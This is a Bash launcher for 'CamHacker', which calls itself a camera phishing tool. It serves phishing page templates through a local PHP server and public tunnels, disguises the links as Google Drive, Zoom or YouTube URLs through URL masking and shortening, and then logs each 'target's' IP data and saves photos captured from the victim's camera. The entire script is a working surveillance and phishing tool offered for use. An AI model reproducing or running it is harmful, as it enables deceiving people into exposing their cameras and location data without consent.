#!/bin/bash

# Colors

black="\033[1;30m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
blue="\033[1;34m"
purple="\033[1;35m"
cyan="\033[1;36m"
violate="\033[1;37m"
white="\033[0;37m"
nc="\033[00m"

# Output snippets
info="${cyan}[${white}+${cyan}] ${yellow}"
info2="${blue}[${white}•${blue}] ${yellow}"
ask="${green}[${white}?${green}] ${purple}"
error="${yellow}[${white}!${yellow}] ${red}"
success="${cyan}[${white}√${cyan}] ${green}"



version="1.5"

cwd=`pwd`
tunneler_dir="$HOME/.tunneler"

# Logo
logo="
${green}
${red}    __ )   |                ___|                     |    
${cyan}|  __ \   |  |   |   _ \  |       __|  |   |   __|  __ \ 
${purple} |   |  |  |   |   __/  |      |     |   | \__ \  | | |
${yellow}____/  _| \__,_| \___| \____| _|    \__,_| ____/ _| |_|
${red}                                            [v${version}]
${blue}                                    [By Hyperion]
"

loclx_help="
${info}Steps: ${nc}
${blue}[1]${yellow} Go to ${green}https://localxpose.io
${blue}[2]${yellow} Create an account 
${blue}[3]${yellow} Login to your account
${blue}[4]${yellow} Visit ${green}https://localxpose.io/dashboard/access${yellow} and copy your authtoken
"

# Check for sudo
if command -v sudo > /dev/null 2>&1; then
    sudo=true
else
    sudo=false
fi

# Check if mac or termux
termux=false
brew=false
cloudflared=false
loclx=false
cf_command="$tunneler_dir/cloudflared"
loclx_command="$tunneler_dir/loclx"
if [[ -d /data/data/com.termux/files/home ]]; then
    termux=true
    cf_command="termux-chroot $tunneler_dir/cloudflared"
    loclx_command="termux-chroot $tunneler_dir/loclx"
fi
if command -v brew > /dev/null 2>&1; then
    brew=true
    if command -v cloudflared > /dev/null 2>&1; then
        cloudflared=true
        cf_command="cloudflared"
    fi
    if command -v localxpose > /dev/null 2>&1; then
        loclx=true
        loclx_command="localxpose"
    fi
fi

ch_prompt="\n${cyan}Cam${nc}@${cyan}Hacker ${red}$ ${nc}"

# Kill running instances of required packages
killer() {
    for process in php wget curl unzip cloudflared loclx localxpose; do
        if pidof "$process"  > /dev/null 2>&1; then
            killall "$process"
        fi
    done
}

# Check if offline
netcheck() {
    while true; do
        wget --spider --quiet https://github.com
        if [ "$?" != 0 ]; then
            echo -e "${error}No internet!\007\n"
            sleep 2
        else
            break
        fi
    done
}


# Set template
url_manager() {
    if [[ "$2" == "1" ]]; then
        echo -e "${info}Your urls are: \n"
    fi
    echo -e "${success}URL ${2} > ${1}\n"
    echo -e "${success}URL ${3} > ${mask}@${1#https://}\n"
    netcheck
    if echo $1 | grep -q "$TUNNELER"; then
        shortened=$(curl -s "https://is.gd/create.php?format=simple&url=${1}")
    else 
        shortened=""
    fi
    if ! [ -z "$shortened" ]; then
        if echo "$shortened" | head -n1 | grep -q "https://"; then
            echo -e "${success}Shortened > ${shortened}\n"
            echo -e "${success}Masked > ${mask}@${shortened#https://}\n"
        fi
    fi
}


# Prevent ^C
stty -echoctl

# Detect UserInterrupt
trap "echo -e '\n${success}Thanks for using!\n'; exit" 2


echo -e "\n${info}Please Wait!...\n${nc}"

# Workdir

if [ -z "$DIRECTORY" ]; then
    exit 1;
else
    if [[ $DIRECTORY == true || ! -d $DIRECTORY ]]; then
        if $termux; then
            if ! [ -d /sdcard/Pictures ]; then
                cd /sdcard && mkdir Pictures
            fi
            FOL="/sdcard/Pictures"
            cd "$FOL"
            if ! [[ -e ".temp" ]]; then
                touch .temp  || (termux-setup-storage && echo -e "\n${error}Please Restart Termux!\n\007" && sleep 5 && exit 0)
            fi
            cd "$cwd"
        else
            if [ -d "$HOME/Pictures" ]; then
                FOL="$HOME/Pictures"
            else
                FOL="$cwd"
            fi
        fi
    else
        FOL="$DIRECTORY"
    fi
fi


# Set Tunneler
if [ -z $TUNNELER ]; then
    exit 1;
else
   if [ $TUNNELER == "cloudflared" ]; then
       TUNNELER="cloudflare"
   fi
fi


# Set Port
if [ -z $PORT ]; then
    exit 1;
else
   if [ ! -z "${PORT##*[!0-9]*}" ] ; then
       printf ""
   else
       PORT=8080
   fi
fi

# Install required packages
for package in php curl wget unzip; do
    if ! command -v "$package" > /dev/null 2>&1; then
        echo -e "${info}Installing ${package}....${nc}"
        for pacman in pkg apt apt-get yum dnf brew; do
            if command -v "$pacman" > /dev/null 2>&1; then
                if $sudo; then
                    sudo $pacman install $package
                else
                    $pacman install $package
                fi
                break
            fi
        done
        if command -v apk > /dev/null 2>&1; then
            if $sudo; then
                sudo apk add $package
            else
                apk add $package
            fi
            break
        fi
        if command -v pacman > /dev/null 2>&1; then
            if $sudo; then
                sudo pacman -S $package
            else
                pacman -S $package
            fi
            break
        fi
    fi
done

# Check for proot in termux
if $termux; then
    if ! command -v proot > /dev/null 2>&1; then
        echo -e "${info}Installing proot...."
        pkg install proot -y
    fi
    if ! command -v proot > /dev/null 2>&1; then
        echo -e "${error}Proot can't be installed!\007\n"
        exit 1
    fi
fi

# Set Region for loclx
if [ -z $REGION ]; then
    exit 1;
fi

# Install tunneler binaries
if $brew; then
    ! $cloudflared && brew install cloudflare/cloudflare/cloudflared
    ! $loclx && brew install localxpose
fi

# Check if required packages are successfully installed
for package in php wget curl unzip; do
    if ! command -v "$package"  > /dev/null 2>&1; then
        echo -e "${error}${package} cannot be installed!\007\n"
        exit 1
    fi
done

# Set subdomain for loclx
if [ -z $SUBDOMAIN ]; then
    exit 1;
fi

local_url="127.0.0.1:${PORT}"

# Check for running processes that couldn't be terminated
killer
for process in php wget curl unzip cloudflared loclx localxpose; do
    if pidof "$process"  > /dev/null 2>&1; then
        echo -e "${error}Previous ${process} cannot be closed. Restart terminal!\007\n"
        exit 1
    fi
done


# Download tunnlers
arch=$(uname -m)
platform=$(uname)
if ! [[ -d $tunneler_dir ]]; then
    mkdir $tunneler_dir
fi
if ! [[ -f $tunneler_dir/cloudflared ]] ; then
    nocf=true
else
    nocf=false
fi
if ! [[ -f $tunneler_dir/loclx ]] ; then
    noloclx=true
else
    noloclx=false
fi
netcheck
rm -rf cloudflared cloudflared.tgz loclx.zip
cd "$cwd"
if echo "$platform" | grep -q "Darwin"; then
    if echo "$arch" | grep -q "x86_64" || echo "$arch" | grep -q "amd64"; then
        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz" "cloudflared.tgz"
        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-darwin-amd64.zip" "loclx.zip"
    elif echo "$arch" | grep -q "arm64" || echo "$arch" | grep -q "aarch64"; then
        echo -e "${error}Device architecture unknown. Download cloudflared manually!"
        sleep 3
        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-darwin-arm64.zip" "loclx.zip"
    else
        echo -e "${error}Device architecture unknown. Download cloudflared/loclx manually!"
        sleep 3
    fi
elif echo "$platform" | grep -q "Linux"; then
    if echo "$arch" | grep -q "arm" || echo "$arch" | grep -q "Android"; then
        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm" "cloudflared"
        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip" "loclx.zip"
    elif echo "$arch" | grep -q "aarch64" || echo "$arch" | grep -q "arm64"; then
        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" "cloudflared"
        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip" "loclx.zip"
    elif echo "$arch" | grep -q "x86_64" || echo "$arch" | grep -q "amd64"; then
        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" "cloudflared"
        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip" "loclx.zip"
    else
        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386" "cloudflared"
        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip" "loclx.zip"
    fi
else
    echo -e "${error}Unsupported Platform!"
    exit
fi



# Check for update
netcheck
if [[ -z $UPDATE ]]; then
    exit 1
else
    if [[ $UPDATE == true ]]; then
        git_ver=`curl -s -N https://raw.githubusercontent.com/KasRoudra/CamHacker/main/files/version.txt`
    else
        git_ver=$version
    fi
fi

if [[ "$git_ver" != "404: Not Found" && "$git_ver" != "$version" ]]; then
    changelog=$(curl -s -N https://raw.githubusercontent.com/KasRoudra/CamHacker/main/files/changelog.log)
    clear
    echo -e "$logo"
    echo -e "${info}CamHacker has a new update!\n${info}Current: ${red}${version}\n${info}Available: ${green}${git_ver}\n"
        printf "${ask}Do you want to update CamHacker?${yellow}[y/n] > $green"
        read upask
        printf "$nc"
        if [[ "$upask" == "y" ]]; then
            cd .. && rm -rf CamHacker camhacker && git clone https://github.com/KasRoudra/CamHacker
            echo -e "\n${success}CamHacker updated successfully!!"
            if [[ "$changelog" != "404: Not Found" ]]; then
                echo -e "${purple}[•] Changelog:\n${blue}"
                echo -e "$changelog" | head -n4
            fi
            exit
        elif [[ "$upask" == "n" ]]; then
            echo -e "\n${info}Updating cancelled. Using old version!"
            sleep 2
        else
            echo -e "\n${error}Wrong input!\n"
            sleep 2
        fi
fi

# Loclx Authtoken
if ! [[ -e "$HOME/.localxpose/.access" ]]; then # if $loclx_command account status | grep -q "Error"; then
    for try in 1 2; do
        echo -e "\n${ask}Enter your loclx authtoken:${yellow}[${blue}Enter 'help' for help${yellow}]"
        printf "$ch_prompt"
        read authtoken
        if [ -z "$authtoken" ]; then
            echo -e "\n${error}No authtoken!\n\007"
            sleep 1
            break
        elif [ "$authtoken" == "help" ]; then
            echo -e "$loclx_help"
            sleep 4
        else
            if ! [ -d "$HOME/.localxpose" ]; then
                mkdir "$HOME/.localxpose"
            fi
            echo -n "$authtoken" > $HOME/.localxpose/.access
            sleep 1
            break
        fi
    done
fi


# Start Point
while true; do
clear
echo -e "$logo"
sleep 1
echo -e "${ask}Choose an option:

${cyan}[${white}1${cyan}] ${yellow}By Allow Access
#${cyan}[${white}2${cyan}] ${yellow}Festival
#${cyan}[${white}3${cyan}] ${yellow}Live Youtube
#${cyan}[${white}4${cyan}] ${yellow}Online Meeting
${cyan}[${white}d${cyan}] ${yellow}Change Image Directory (current: ${red}${FOL}${yellow})
${cyan}[${white}p${cyan}] ${yellow}Change Default Port (current: ${red}${PORT}${yellow})
${cyan}[${white}x${cyan}] ${yellow}About
${cyan}[${white}m${cyan}] ${yellow}More tools
${cyan}[${white}0${cyan}] ${yellow}Exit${blue}
"
sleep 1
if [ -z $OPTION ]; then
    exit 1
else
    if [[ $OPTION == true ]]; then
        printf "$ch_prompt"
        read option
    else
        option=$OPTION
    fi
fi
# Select template
    if echo $option | grep -q "1"; then
        dir="jio"
        mask="https://google.drive"
        break
    elif echo $option | grep -q "2"; then
        dir="fest"
        echo -e "\n${ask}Enter festival name${yellow} (Current: ${green}birthday):${cyan}"
        printf "$ch_prompt"
        read fest_name
        mask="https://best-wishes-to-you"
        break
    elif echo $option | grep -q "3"; then
        dir="live"
        echo -e "\n${ask}Enter youtube video ID:${cyan}"
        printf "$ch_prompt"
        read vid_id
        mask="https://watch-youtube-videos-live"
        break
    elif echo $option | grep -q "4"; then
        dir="om"
        mask="https://join-zoom-online-meeting"
        break
    elif echo $option | grep -q "p"; then
        echo -e "\n${ask}Enter Port:${cyan}"
        printf "$ch_prompt"
        read pore
        if [ ! -z "${pore##*[!0-9]*}" ] ; then
            PORT=$pore;
            local_url="127.0.0.1:${PORT}"
            echo -e "\n${success}Port changed to ${cyan}${PORT}${green} successfully!\n"
            sleep 2
        else
            echo -e "\n${error}Invalid port!\n\007"
            sleep 2
        fi
    elif echo $option | grep -q "d"; then
        echo -e "\n${ask}Enter Directory:${cyan}"
        printf "$ch_prompt"
        read dire
        if ! [ -d $dire ]; then
            echo -e "\n${error}Invalid directory!\n\007"
            sleep 2
        else
            FOL="$dire"
            echo -e "\n${success}Directory changed successfully!\n"
            sleep 2
        fi
    elif echo $option | grep -q "x"; then
        clear
        echo -e "$logo"
        echo -e "$red[ToolName]  ${cyan}  :[CamHacker]
$red[Version]    ${cyan} :[${version}]
$red[Description]${cyan} :[Camera Phishing tool By kasroudra]
$red[Author]     ${cyan} :[Hyperion]
$red[Github]     ${cyan} :[https://github.com/bnsbluss]
$red[Messenger]  ${cyan} :[https://m.me/KasRoudra]"
        printf "$ch_prompt"
        read about
    elif echo $option | grep -q "m"; then
        xdg-open "https://github.com/bnsbluss"
    elif echo $option | grep -q "0"; then
        echo -e "\n${success}Thanks for using!\n"
        exit 0
    else
        echo -e "\n${error}Invalid input!\007"
        OPTION=true
        sleep 1
    fi
done
if ! [ -d "$HOME/.site" ]; then
    mkdir "$HOME/.site"
else
    cd $HOME/.site
    rm -rf *
fi
cd "$cwd"
if [ -e websites.zip ]; then
    unzip websites.zip > /dev/null 2>&1
    rm -rf websites.zip
fi

if ! [ -d sites ]; then
    mkdir sites
    netcheck
    wget -q --show-progress "https://github.com/KasRoudra/CamHacker/releases/latest/download/websites.zip"
    unzip websites.zip -d sites > /dev/null 2>&1
    rm -rf websites.zip
fi
cd sites/$dir
cp -r * "$HOME/.site"
# Hotspot required for termux
if $termux; then
    echo -e "\n${info2}If you haven't turned on hotspot, please enable it!"
    sleep 3
fi
echo -e "\n${info}Starting php server at localhost:${PORT}....\n"
netcheck
php -S "${local_url}" -t "$HOME/.site" > /dev/null 2>&1 &
sleep 2
sleep 1
status=$(curl -s --head -w %{http_code} "${local_url}" -o /dev/null)
if echo "$status" | grep -q "404"; then
    echo -e "${error}PHP couldn't start!\n\007"
    killer
    exit 1
else
    echo -e "${success}PHP has started successfully!\n"
fi
echo -e "${info2}Starting tunnelers......\n"
find "$tunneler_dir" -name "*.log" -delete
netcheck
args=""
if [ "$REGION" != false ]; then
    args="--region $REGION"
fi
if [ "$SUBDOMAIN" != false ]; then
    if [ "$args" == "" ]; then
        args="--subdomain $SUBDOMAIN"
    else
        args="$args --subdomain $SUBDOMAIN"
    fi
fi
$cf_command tunnel -url "${local_url}" &> "$tunneler_dir/cf.log" &
$loclx_command tunnel --raw-mode http --https-redirect $args -t "${local_url}" &> "$tunneler_dir/loclx.log" &
sleep 10
cd "$HOME/.site"
if echo $option | grep -q "2"; then
    if ! [ -z "$fest_name" ]; then
        sed -i s/"birthday"/"$fest_name"/g index.html
    fi
fi
if echo $option | grep -q "3"; then
    if ! [ -z "$vid_id" ]; then
         netcheck
         if curl -s -N "https://www.youtube.com/embed/${vid_id}?autoplay=1" | grep -q "https://www.youtube.com/watch?v=${vid_id}"; then
              sed -i s/"6hHmkInZkMQ"/"$vid_id"/g index.html
         else
              echo -e "${error}Inavlid youtube video ID!. Using default value.\007\n"
         fi
    fi
fi
for second in {1..10}; do
    if [ -f "$tunneler_dir/cf.log" ]; then
        cflink=$(grep -Eo "https://[-0-9a-z.]{4,}.trycloudflare.com" "$tunneler_dir/cf.log")
        sleep 1
    fi
    if ! [ -z "$cflink" ]; then
        cfcheck=true
        break
    else
        cfcheck=false
    fi
done
for second in {1..10}; do
    if [ -f "$tunneler_dir/loclx.log" ]; then
        loclxlink=$(grep -o "[-0-9a-z.]*.loclx.io" "$tunneler_dir/loclx.log")
        sleep 1
    fi
    if ! [ -z "$loclxlink" ]; then
        loclxcheck=true
        loclxlink="https://${loclxlink}"
        break
    else
        loclxcheck=false
    fi
done
if ( $cfcheck && $loclxcheck ); then
    echo -e "${success}Cloudflared and Loclx have started successfully!\n"
    url_manager "$cflink" 1 2
    url_manager "$loclxlink" 3 4
elif ( $cfcheck &&  ! $loclxcheck ); then
    echo -e "${success}Cloudflared has started successfully!\n"
    url_manager "$cflink" 1 2
elif ( $loclxcheck &&  ! $cfcheck ); then
    echo -e "${success}Loclx has started successfully!\n"
    url_manager "$loclxlink" 1 2
elif ( $cfcheck && $loclxcheck &&  ! $loclxcheck ); then
    echo -e "${success}Cloudflared and Loclx have started successfully!\n"
    url_manager "$cflink" 1 2
    url_manager "$loclxlink" 3 4
else
    echo -e "${error}Tunneling failed! Start your own port forwarding/tunneling service at port ${PORT}\n";
fi
sleep 1
rm -rf ip.txt
echo -e "${info}Waiting for target. ${cyan}Press ${red}Ctrl + C ${cyan}to exit...\n"
while true; do
    if [[ -e "ip.txt" ]]; then
        echo -e "\007${success}Target opened the link!\n"
        while IFS= read -r line; do
            echo -e "${green}[${blue}*${green}]${yellow} $line"
        done < ip.txt
        echo ""
        cat ip.txt >> "$cwd/ip.txt"
        rm -rf ip.txt
    fi
    sleep 0.5
    if [[ -e "log.txt" ]]; then
        echo -e "\007${success}Image downloaded! Check directory!\n"
        file=`ls | grep png`
        mv -f $file $FOL
        rm -rf log.txt
    fi
    sleep 0.5
done

